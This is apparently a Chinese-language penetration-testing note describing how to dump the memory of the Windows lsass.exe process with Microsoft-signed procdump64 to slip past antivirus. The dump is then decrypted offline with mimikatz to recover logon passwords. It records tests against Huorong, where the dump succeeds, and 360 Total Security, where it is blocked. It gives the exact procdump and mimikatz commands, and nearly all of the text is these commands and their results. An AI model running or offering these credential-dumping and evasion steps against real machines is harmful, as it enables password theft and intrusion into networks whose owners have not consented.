### 0x00 基本原理
利用procdump是微软签名的程序，自带免杀性  
这里要注意：需要使用64位的procdump以及64位的mimikatz

### 0x01 测试火绒过程记录
受害虚拟机：Windows 2008 R2安装火绒  
上传procdump64.exe到受害机后执行命令
```
.\procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```
提取进程lsass.exe的内存到文件lsass.dmp中，如下图  
![image](./pic/0.png)  
下载提取到的lsass.dmp到攻击机的64位mimikatz目录下，执行命令
```
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```
成功解密出密码，如下图  
![image](./pic/1.png)  

### 0x02 测试360安全卫士过程记录
受害虚拟机：Windows 2008 R2安装360安全卫士  
执行命令
```
.\procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```
会被拦截，如下图  
![image](./pic/2.png)  
